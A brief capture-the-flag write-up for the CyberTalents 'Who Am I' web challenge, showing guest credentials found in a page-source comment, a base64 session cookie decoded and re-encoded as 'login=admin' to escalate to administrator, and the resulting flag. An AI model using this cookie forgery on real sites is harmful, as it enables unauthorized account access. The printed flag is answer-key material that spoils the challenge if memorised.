# Cyber Talents: Who Am I
* First in page source-code I found the account:
```bash
<!-- 
            Guest Account:
            -=-=-=-=-=-=-=-
            Username:Guest
            Password:Guest  
-->
```
* Second I connected with it
* In coockies section I found: bG9naW49R3Vlc3Q%3D
* after the command:
```bash
echo -n "bG9naW49R3Vlc3Q%3D" | base64 -d
%>login=Guest
```
* then I changed it to:
```bash
echo -n "login=admin" | base64
%>bG9naW49YWRtaW4=
```
* I use it as new coockies to connect
* And then log in with it and got the flag:
```bash
FLag{B@D_4uTh1Nt1C4Ti0n}
```
